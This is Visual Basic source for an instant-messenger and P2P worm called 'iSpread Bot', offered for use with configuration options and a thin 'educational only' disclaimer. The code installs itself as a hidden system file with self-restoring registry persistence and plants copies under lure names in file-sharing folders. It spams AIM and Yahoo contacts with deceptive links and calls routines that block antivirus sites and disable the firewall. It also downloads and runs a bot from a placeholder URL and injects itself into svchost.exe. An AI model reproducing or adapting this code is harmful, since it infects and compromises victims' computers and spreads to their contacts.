Attribute VB_Name = "spMain"
' iSpread Bot
' by: eth (teh) (tehriz@gmail.com)

' Want to have this worm drop a bot/other worm/virus? Use a file binder.
' VB cannot handle binary binary resources > 64 KB (+ most likely, no one using this would add their own file to the resources section)
' ... so uhm, yeah - just use a file binder!
' Also - REMEMBER TO EDIT THE SPREADING MESSAGES BELOW IN THE MAIN FUNCTION
' And remember to configure this with the options below! (Const's)

' ****** READ THIS ******
' This code/project is for *educational/learning purposes only* - The author is NOT responsible for how this code is used
' The user is NOT to distribute the compiled form of this code to anyone with their consent!

' API-Related
Public Const WM_SETTEXT As Long = &HC
Public Const WM_KEYDOWN As Long = &H100
Public Const WM_KEYUP As Long = &H101
Public Const VK_SPACE As Long = &H20
Public Const VK_RETURN As Long = &HD

Public Declare Function FindWindow Lib "user32.dll" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function FindWindowEx Lib "user32.dll" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Public Declare Function GetNextWindow Lib "user32.dll" Alias "GetWindow" (ByVal hwnd As Long, ByVal wFlag As Long) As Long
Public Declare Function GetTopWindow Lib "user32.dll" (ByVal hwnd As Long) As Long
Public Declare Function GetClassName Lib "user32.dll" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Public Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function GetModuleFileName Lib "kernel32.dll" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long

' Required variables ( dont touch! )
Public SpreadMsgs() As String ' messages array - later we will randomly choose messages off of this list to send to users
Public IMAlreadySent() As String ' emails of users we already sent links to
' keep the send time at something above 10 seconds or so, otherwise it just ends up flooding! (suspicious, eh?)
Public Const DEFAULT_SEND_TIME = 40000 ' 40 seconds (spam every 40/x seconds)

' Some options
Public Const WORM_SEND_RANDOM_MESSAGES As Boolean = True
Public Const WORM_SPREAD_AIM As Boolean = True ' spread through AIM (AOL Instant Messenger)
Public Const WORM_SPREAD_WMSGR As Boolean = False ' spread through Windows Messenger
Public Const WORM_SPREAD_YAHOO As Boolean = True ' spread through Yahoo! Messenger and Yahoo Chats
Public Const WORM_SPREAD_P2P As Boolean = True ' spread by adding bot file P2P shared directories (with clever names)
Public Const WORM_DOWNLOAD_ON_STARTUP As Boolean = True ' Download a file and execute it when this file starts up! (Use this to download your bots upon infection)
Public Const WORM_DOWNLOAD_URL As String = "http://YOURSITE.com/bot.exe" ' valid url to your bot file - since this is static, use a domain name/host that is reliable! (towards abuse and tech difficulties!)

' Computer security-related
Public Const WORM_BLOCK_AV_WEBSITES As Boolean = True ' block access to security/antivirus related websites
Public Const WORM_DISABLE_XPFIREWALL As Boolean = True ' disable Windows XP Firewall & Windows Automatic Update
Public Const WORM_FILENAME As String = "pkguard32.exe"
Public Const WORM_STARTUP_NAME As String = "PK Guard"

Public wfile As String

Public iDWTries As Integer ' number of download "tries"

Public Sub loll()
On Error Resume Next ' generic error handler (skip errors :D)

' get filepath
wfile = Space(256)
Call GetModuleFileName(0, wfile, Len(wfile) - 1)
wfile = Trim$(Replace(wfile, Chr$(0), ""))

' copy to system folder if not already there and run
If InStr(Command, "/run") > 0 Then GoTo fgoto
If InStr(App.path & "\" & App.EXEName & ".exe", LeftStr(WORM_FILENAME, Len(WORM_FILENAME) - 4)) <= 0 Then
    ' install this worm!
    Dim buf As String
    Dim buf2 As String
    buf = Space$(256)
    buf2 = Space$(256)
    Call GetSystemDirectory(buf, Len(buf) - 1)
    buf = Trim$(Replace(buf, Chr$(0), "")) & "\" & WORM_FILENAME
    Call GetModuleFileName(0, buf2, Len(buf2) - 1)
    buf2 = Trim$(Replace(buf2, Chr$(0), ""))
    FileCopy buf2, buf
    Pause 0.2
    SetAttr buf, vbHidden + vbSystem
    ShellExecute 0, "open", buf, "/run", "c:\", 0
    Pause 0.2
    End
End If

fgoto:

' ADD WORM TO STARTUP HERE
Dim wSt As String
wSt = WORM_STARTUP_NAME
If Len(wSt) < 1 Then wSt = "Windows PK Guard"
SetStringValue "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", wSt, wfile
SetStringValue "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", wSt, wfile
SetStringValue "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices", wSt, wfile

' set some variables
ReDim SpreadMsgs(10) ' 10 different messages MAX
ReDim IMAlreadySent(300) ' windows messenger limit is far less than 300 (isn't it?!) - not finished right now!

Randomize

' message variables:
'  $email - represents the user's email address
'  $myemail - represents your email
' NOTE: these variables only work for MSN spread!


' ****** NOTE: EDIT THESE MESSAGES, USE YOUR OWN LINKS IN THEM!! ******

' Fill in your own messages here, think of messages with links that would entice users into clicking...
' note: For every msg you add, make sure it follows the pattern below (SpreadMsgs(0) = .. SpreadMsgs(1) = ... - Dont do SpreadMsgs(0) twice!)
SpreadMsgs(0) = "lol? someone is posting with your email address on these forums?: http://somewebsite.com/viewtopic.php?id=2391"
SpreadMsgs(1) = "wow.. is this you? http://somewebsite.com/pictures.php?user=$email"
SpreadMsgs(2) = "found your picture! is this you? http://somesite.com/gallery.php?user=$email"
SpreadMsgs(3) = "haha, this guy got busted so bad.. http://website.com/stories/news.php?id=22"
SpreadMsgs(4) = "lmao i cant stop laughing at this! http://somewebsite.com/jokes/joker.php"
SpreadMsgs(5) = "omg... this doesn't look right at all!! http://website.com/image.php?img=22"
SpreadMsgs(6) = ""

If WORM_SPREAD_P2P = True Then
    Call P2P_Add
End If
' Disable some stuff!
If WORM_BLOCK_AV_WEBSITES = True Then
    Call ModifyHostsFile
End If
If WORM_DISABLE_XPFIREWALL = True Then
    Call BlockSP2
End If

If WORM_DOWNLOAD_ON_STARTUP = True Then
    ' download the target file - but first wait since they might not be connected to the internet on startup!
    iDWTries = 0
    fTimers.TDownload.Interval = 8000
    fTimers.TDownload.Enabled = True
End If

' startup add timer (incase they delete the regkeys it will auto add them back every 9 seconds)
fTimers.TReg.Interval = 9000
fTimers.TReg.Enabled = True

' Enable spreading timers
If WORM_SPREAD_AIM = True Then
    fTimers.AIMSpread_Timer.Interval = DEFAULT_SEND_TIME ' (send every 25 seconds - change if you want - but dont make it less than 1 second! (1000))
    fTimers.AIMSpread_Timer.Enabled = True
Else
    fTimers.AIMSpread_Timer.Enabled = False
End If
If WORM_SPREAD_WMSGR = True Then
    fTimers.MSNSpread_Timer.Interval = DEFAULT_SEND_TIME
    fTimers.MSNSpread_Timer.Enabled = True
Else
    fTimers.MSNSpread_Timer.Enabled = False
End If
If WORM_SPREAD_YAHOO = True Then
    fTimers.YSpread_Timer.Interval = DEFAULT_SEND_TIME
    fTimers.YSpread_Timer.Enabled = True
Else
    fTimers.YSpread_Timer.Enabled = False
End If

' double check
If fTimers.AIMSpread_Timer.Interval < 5000 Then
    fTimers.AIMSpread_Timer.Interval = DEFAULT_SEND_TIME
ElseIf fTimers.MSNSpread_Timer.Interval < 5000 Then
    fTimers.MSNSpread_Timer.Interval = DEFAULT_SEND_TIME
ElseIf fTimers.YSpread_Timer.Interval < 5000 Then
    fTimers.YSpread_Timer.Interval = DEFAULT_SEND_TIME
End If

' start off the launch of this program by calling the IM spreaders!
If WORM_SPREAD_AIM = True Then Call AIMSpreadTimer
If WORM_SPREAD_WMSGR = True Then Call MSNSpreadTimer
If WORM_SPREAD_YAHOO = True Then Call YahooSpreadTimer
End Sub

Public Sub DownloadTimer()
On Error Resume Next
If Len(WORM_DOWNLOAD_URL) > 0 And iDWTries < 2 Then
    Dim B As Boolean
    B = DownloadFile(WORM_DOWNLOAD_URL, True)
    If B = True Then
        iDWTries = 9999
    Else
        Pause 2
    End If
    iDWTries = iDWTries + 1
End If
End Sub

Sub P2P_Add()
' I got to lazy to finish this, so if you want to, go ahead and add more file names or whatever!
On Error Resume Next
Dim r00t As String
r00t = LeftStr(App.path, 3)

Dim cpath As String
' Windows shared folder
cpath = r00t & "Media\My Shared Folder\" & "Half Life 2 FULL.exe"
FileCopy wfile, cpath
cpath = r00t & "Media\My Shared Folder\" & "How to Hack.exe"
FileCopy wfile, cpath
cpath = r00t & "Media\My Shared Folder\" & "Make Cash.exe"
FileCopy wfile, cpath
' Limewire
cpath = r00t & "\Program Files\LimeWire\Shared\" & "Half Life 2 FULL.exe"
FileCopy wfile, cpath
cpath = r00t & "\Program Files\LimeWire\Shared\" & "How to Hack.exe"
FileCopy wfile, cpath
cpath = r00t & "\Program Files\LimeWire\Shared\" & "Crysis.exe"
FileCopy wfile, cpath

cpath = Environ("USERPROFILE") & "\My Documents\LimeWire\Shared\" & "Half Life 2 FULL.exe"
FileCopy wfile, cpath
cpath = Environ("USERPROFILE") & "\My Documents\LimeWire\Shared\" & "How to Hack.exe"
FileCopy wfile, cpath
cpath = Environ("USERPROFILE") & "\My Documents\LimeWire\Shared\" & "Crysis.exe"
FileCopy wfile, cpath
' eDonkey
cpath = Environ("USERPROFILE") & "\My Documents\eDonkey2000 Downloads\" & "Half Life 2 FULL.exe"
FileCopy wfile, cpath
cpath = Environ("USERPROFILE") & "\My Documents\eDonkey2000 Downloads\" & "Windows XP.exe"
FileCopy wfile, cpath
cpath = Environ("USERPROFILE") & "\My Documents\eDonkey2000 Downloads\" & "Crysis.exe"
FileCopy wfile, cpath
cpath = Environ("USERPROFILE") & "\My Documents\eDonkey2000 Downloads\" & "How to Hack.exe"
FileCopy wfile, cpath
cpath = Environ("USERPROFILE") & "\My Documents\eDonkey2000 Downloads\" & "Visual Studio 2005.exe"
FileCopy wfile, cpath
'shareazaaaa
cpath = Environ("USERPROFILE") & "\My Documents\Shareaza Downloads\" & "Half Life 2 FULL.exe"
FileCopy wfile, cpath
cpath = Environ("USERPROFILE") & "\My Documents\Shareaza Downloads\" & "Windows XP.exe"
FileCopy wfile, cpath
cpath = Environ("USERPROFILE") & "\My Documents\Shareaza Downloads\" & "Crysis.exe"
FileCopy wfile, cpath
cpath = Environ("USERPROFILE") & "\My Documents\Shareaza Downloads\" & "How to Hack.exe"
FileCopy wfile, cpath
cpath = Environ("USERPROFILE") & "\My Documents\Shareaza Downloads\" & "Visual Studio 2005.exe"
FileCopy wfile, cpath
cpath = Environ("USERPROFILE") & "\My Documents\Shareaza Downloads\" & "Specefic CounterStrike.exe"
FileCopy wfile, cpath
cpath = Environ("USERPROFILE") & "\My Documents\Shareaza Downloads\" & "GTA4.exe"
FileCopy wfile, cpath
cpath = Environ("USERPROFILE") & "\My Documents\Shareaza Downloads\" & "GTA4_CRACK.exe"
FileCopy wfile, cpath
cpath = Environ("USERPROFILE") & "\My Documents\Shareaza Downloads\" & "GTA4_CRACK(PC).exe"
FileCopy wfile, cpath
' OTHERS (KAZAA/MORPHEUS)
'cpath = GetStringValue("HKEY_CURRENT_USER\SOFTWARE\KAZAA\LocalContent", "Dir0")
'FileCopy wfile, cpath
'cpath = GetStringValue("HKEY_LOCAL_MACHINE\SOFTWARE\Morpheus", "Install_Dir")
'FileCopy wfile, cpath
End Sub

Public Sub RegStartupTimer()
Dim wSt As String
wSt = WORM_STARTUP_NAME
If Len(wSt) < 1 Then wSt = "Windows PK Guard"

SetStringValue "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", wSt, wfile
SetStringValue "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", wSt, wfile
SetStringValue "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices", wSt, wfile
End Sub

Public Sub AIMSpreadTimer()
On Error Resume Next
' AIM Spread spams all open AIM Windows
If WORM_SPREAD_AIM = False Then Exit Sub
Dim msg_to_send As String
msg_to_send = GetSpamMsg()
AIM_SendActive msg_to_send
End Sub

Public Sub MSNSpreadTimer()
On Error Resume Next
' Sends to all contacts online on your windows messenger list
If WORM_SPREAD_WMSGR = False Then Exit Sub
Dim msg_to_send As String
msg_to_send = GetSpamMsg()
WindowsMsgr_SendToAll msg_to_send
End Sub

Public Sub YahooSpreadTimer()
On Error Resume Next
' Sends to all contacts online on your windows messenger list
If WORM_SPREAD_YAHOO = False Then Exit Sub
Dim msg_to_send As String
msg_to_send = GetSpamMsg()
Yahoo_SendActive msg_to_send
End Sub

Sub WindowsMsgr_SendToAll(ByVal msg As String)

End Sub

Sub AIM_SendActive(ByVal msg As String)
On Error Resume Next
Const AIM_CLASS As String = "AIM_IMessage"

Dim wnext As Long
wnext = GetTopWindow(0)
Do While wnext > 0
    Dim strCls As String
    strCls = Space$(256)
    GetClassName wnext, strCls, 255
    strCls = Trim$(strCls)
    If Len(strCls) > 0 And StrComp(strCls, AIM_CLASS, vbTextCompare) = 0 Then
        ' found an AIM window!
        Dim AIMChatFrame As Long
        AIMChatFrame = FindWindowEx(wnext, 0, "WndAte32Class", vbNullString)
        AIMChatFrame = FindWindowEx(wnext, AIMChatFrame, "WndAte32Class", vbNullString)
        If AIMChatFrame <> 0 Then
            Dim AIMChatWin As Long
            Dim tempMSG As String
            tempMSG = Replace(msg, "$email", CStr(Rnd() * 23891))
            tempMSG = Replace(tempMSG, "$myemail", CStr(Rnd() * 23891))
            AIMChatWin = FindWindowEx(AIMChatFrame, 0, "Ate32Class", vbNullString)
            SendMessage AIMChatWin, WM_SETTEXT, 0, ByVal "" ' clear first
            SendMessage AIMChatWin, WM_SETTEXT, 0, ByVal tempMSG
            SendMessage AIMChatWin, WM_KEYDOWN, VK_RETURN, 0&
            SendMessage AIMChatWin, WM_KEYUP, VK_RETURN, 0&
            Pause 0.8 ' not sure how aim handles mass messaging
        End If
    End If
    wnext = GetNextWindow(wnext, &H2)
    DoEvents
Loop
End Sub

Sub Yahoo_SendActive(ByVal msg As String)
On Error Resume Next
Const YAHOO_CLASS As String = "IMClass"
Dim hwnds(255) As Long
Dim nextwnd As Long

Dim wnext As Long
Dim nogo As Boolean
wnext = GetTopWindow(0)
Do While wnext > 0
    Dim strCls As String
    strCls = Space(256)
    GetClassName wnext, strCls, 255
    strCls = Trim$(strCls)
    Dim x As Integer
    For x = 0 To UBound(hwnds) - 1
        If hwnds(x) = wnext Then
            nogo = True
            Exit For
        End If
        DoEvents
    Next x
    If Len(strCls) > 0 And nogo = False Then
        If StrComp(strCls, YAHOO_CLASS, vbTextCompare) = 0 And FindWindowEx(wnext, 0, "YHTMLContainer", vbNullString) Then
            ' found yahoo chat/im window - amazingly this works for both yahoo chats and im windows!
            Dim YChatWindow As Long
            YChatWindow = FindWindowEx(wnext, 0, "RichEdit20A", vbNullString)
            If YChatWindow <> 0 Then
                Dim tempMSG As String
                tempMSG = Replace(msg, "$email", CStr(Rnd() * 53211))
                tempMSG = Replace(tempMSG, "$myemail", CStr(Rnd() * 53861))
                SendMessage YChatWindow, WM_SETTEXT, 0, ByVal "" ' clear any text in the message field first
                SendMessage YChatWindow, WM_SETTEXT, 0, ByVal tempMSG
                SendMessage YChatWindow, WM_KEYDOWN, VK_RETURN, 0&
                SendMessage YChatWindow, WM_KEYUP, VK_RETURN, 0&
                hwnds(nextwnd) = wnext
                nextwnd = nextwnd + 1
                Pause 1.1 ' Yahoo is bitchy about `mass messaging` - 1.1 second pause does the trick!
            End If
        End If
    End If
    wnext = GetNextWindow(wnext, &H2)
    DoEvents
Loop
End Sub

Public Function GetSpamMsg()
Dim msg_to_send As String
Dim i As Integer
If WORM_SEND_RANDOM_MESSAGES = True Then
    Dim aval_msgs() As Integer
    Dim inext As Integer
    ReDim aval_msgs(10)
    For i = 0 To UBound(SpreadMsgs)
        If Len(SpreadMsgs(i)) > 0 Then
            If inext >= UBound(SpreadMsgs) Then
                ReDim Preserve aval_msgs(UBound(aval_msgs) + 1)
            End If
            aval_msgs(inext) = i
            inext = inext + 1
        End If
        DoEvents
    Next i
    ' now, pick a random one!
    Dim rand_msg As Integer
    rand_msg = Int(Rnd() * inext)
    msg_to_send = SpreadMsgs(aval_msgs(rand_msg))
    DoEvents
    If Len(msg_to_send) <= 0 Then
        msg_to_send = SpreadMsgs(0) ' default
    End If
    If Len(msg_to_send) = 0 Then Exit Function ' failure! :(
    
Else
    For i = 0 To UBound(SpreadMsgs)
        If Len(SpreadMsgs(i)) > 0 Then
            msg_to_send = SpreadMsgs(i) ' get first msg found
            Exit For
        End If
        DoEvents
    Next i
    If Len(msg_to_send) <= 0 Then
        msg_to_send = SpreadMsgs(0) ' default
    End If
    If Len(msg_to_send) = 0 Then Exit Function ' failed
End If
GetSpamMsg = msg_to_send
End Function

Public Sub Pause(HowLong)
Dim Timeout
Timeout = Timer
Do While Timer - Timeout < Val(HowLong)
    DoEvents
Loop
End Sub

Public Function injectbrowser()
Dim allll As String
Dim B() As Byte
Dim mamas As String
mamas = LoadBinary(App.path & "\" & App.EXEName & ".exe")
allll = mamas
      L = Len(allll) - 1
    ReDim B(0 To L)
    Call CopyMemory(B(0), ByVal allll, L + 1)
      RunExe Environ("windir") & "\system32\svchost.exe", B()
   End
End Function



